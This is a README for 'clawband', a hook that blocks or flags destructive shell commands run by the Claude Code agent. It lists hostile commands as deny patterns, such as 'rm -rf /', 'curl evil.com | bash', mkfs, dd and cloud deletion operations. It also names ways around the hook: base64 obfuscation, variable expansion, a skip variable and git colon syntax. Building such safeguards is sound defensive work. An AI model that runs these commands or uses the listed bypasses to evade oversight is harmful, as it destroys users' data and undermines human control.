# clawband

A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.

## What it does

Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:

- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
- **Loads user-defined pattern files** so you can customise behaviour without touching the script

### Why compound-command splitting matters

A naive check on the full command string misses chained attacks like:

```sh
ls -la && rm -rf /
```

clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.

Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.

## Installation

```sh
bash install.sh
```

The installer:
1. Copies `clawband.sh` to `~/.claude/hooks/clawband.sh`
2. Creates `~/.clawband/deny.patterns`, `ask.patterns`, and `allow.patterns` from the included examples
3. Wires up the hook in `~/.claude/settings.json`

Then run `/hooks` in Claude Code (or restart the session) to activate.

### Manual installation

```sh
mkdir -p ~/.claude/hooks
cp clawband.sh ~/.claude/hooks/clawband.sh
chmod +x ~/.claude/hooks/clawband.sh
```

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "~/.claude/hooks/clawband.sh"
          }
        ]
      }
    ]
  }
}
```

## Built-in patterns

### Blocked (deny)

| Category | Examples |
|----------|---------|
| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
| Silent file emptying | `truncate -s 0` |
| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
| Database destruction | `dropdb` |
| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (and without space) |
| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
| find/xargs escalation | `find .* -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |

### Prompted (ask)

| Category | Examples |
|----------|---------|
| eval | `eval ` — common in shell init (`eval "$(brew shellenv)"`) but executes arbitrary strings |
| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
| Remote branch deletion | `git push --delete` |

### Safe patterns preserved

- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
- `| python3 -m module` — module invocation is allowed
- `--force-with-lease` — safe alternative to force push
- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator

## Custom patterns

Extend or override behaviour without touching the script:

| File | Effect |
|------|--------|
| `~/.clawband/deny.patterns` | Always block — added to built-in deny list |
| `~/.clawband/ask.patterns` | Always prompt — added to built-in ask list |
| `~/.clawband/allow.patterns` | Override a block — matched commands skip all checks |

Each file is one pattern per line, case-insensitive extended regex. Lines starting with `#` and blank lines are ignored.

See `deny.patterns.example` and `ask.patterns.example` for documented examples.

### Example: block a project-specific command

```sh
# ~/.clawband/deny.patterns
my-infra nuke --all
docker system prune
```

### Example: allow git reset --hard on a specific path

```sh
# ~/.clawband/allow.patterns
git reset --hard HEAD
```

## Options

Set in `clawband.sh` or as environment variables:

| Variable | Default | Effect |
|----------|---------|--------|
| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
| `CLAWBAND_SKIP` | `0` | Bypass all checks (for trusted wrapper scripts) |

### Audit log

Enable with `CLAWBAND_LOG=1` in `clawband.sh`:

```
[2025-06-01T12:34:56Z] DENY | Blocked: 'rm -rf /' matched in: rm -rf / | rm -rf /tmp/test && rm -rf /
[2025-06-01T12:35:02Z] ASK  | Review before running — 'eval ' matched in: eval "$(cat .env)" | eval "$(cat .env)"
```

## How the hook communicates with Claude Code

The hook reads the tool call JSON from stdin and writes a JSON response to stdout:

- **deny** — command is blocked outright, Claude sees a permission error
- **ask** — Claude Code shows a confirmation prompt before proceeding
- **exit 0 (no output)** — command proceeds normally

The hook always exits 0 — a non-zero exit is treated as a hook failure rather than an intentional block.

## Requirements

- `bash` 3.2+
- `jq`

Both are available by default on macOS and most Linux distributions.

## Limitations

- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split at parse time. The hook asks for user confirmation rather than hard-blocking, since subshells are common in legitimate commands.
- **Obfuscated commands** — this hook matches literal strings and patterns. Base64-encoded payloads or variable expansion can bypass it. It is a first line of defence, not a sandbox.
- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` would not be caught.
- **git push `:branch` syntax** — the colon-prefix form of remote branch deletion (`git push origin :branch`) is not currently blocked; use `--delete` instead.

## Contributing

Contributions welcome. If you find a destructive pattern that should be blocked or prompted, open a PR adding it to `DENY_PATTERNS` or `ASK_PATTERNS` in `clawband.sh` with a comment explaining the risk.

## Licence

MIT
